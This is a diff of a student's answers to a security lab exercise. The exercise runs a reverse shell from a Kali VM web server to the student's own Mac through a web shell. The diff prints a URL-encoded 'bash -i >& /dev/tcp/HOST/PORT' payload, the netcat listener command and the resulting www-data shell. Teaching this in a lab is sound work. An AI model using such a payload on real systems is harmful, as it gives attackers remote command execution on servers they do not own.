@@ -91,13 +91,23 @@ b. What are the IP addresses of your host OS (the attacking machine)? How did yo
 
 c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT
 
+> *Ran the command nc -l 5050 in my mac terminal*
 
-In a browser on your host machine, use your web shell to go to this crazy URL.
-http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
-            Note that "YOUR_WEBSHELL" should of course be replaced
-            by the name of your web shell you installed in the Apache2 home directory on
-            Kali during Part 3.
-            
-Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?
-What are all those % codes in the URL you used?
-Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
+d. In a browser on your host machine, use your web shell to go to this crazy URL.
+
+> *My URL is: http://192.168.64.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/5050%200%3E%261%22*
+
+e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?
+
+> *I have successfully established a reverse shell connection from my Kali VM back to my macOS. The output show `www-data@kali:/var/www/html$`*
+>
+> *Yes, I can execute commands on Kali from my macOS now. Here is a screenshot of the `ls` command that listed the files in the `/var/www/html` directory and `whoami` command that displayed the username of the current user on Kali:*
+>
+>  <img width="255" alt="Screenshot 2024-10-29 at 2 55 31 PM" src="https://github.com/user-attachments/assets/ea34c3b3-f027-4dc6-97d0-bf108de33cf9">
+>
+> *I know the shell is from my Kali because the prompt shows `www-data@kali`, where www-data is the username and kali is the hostname of the Kali VM. And, when I run pwd to see my current working directory, the output is `/var/www/html`, which is the default location for the Apache web server on Kali Linux.*
+
+f. What are all those % codes in the URL you used?
+
+
+g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
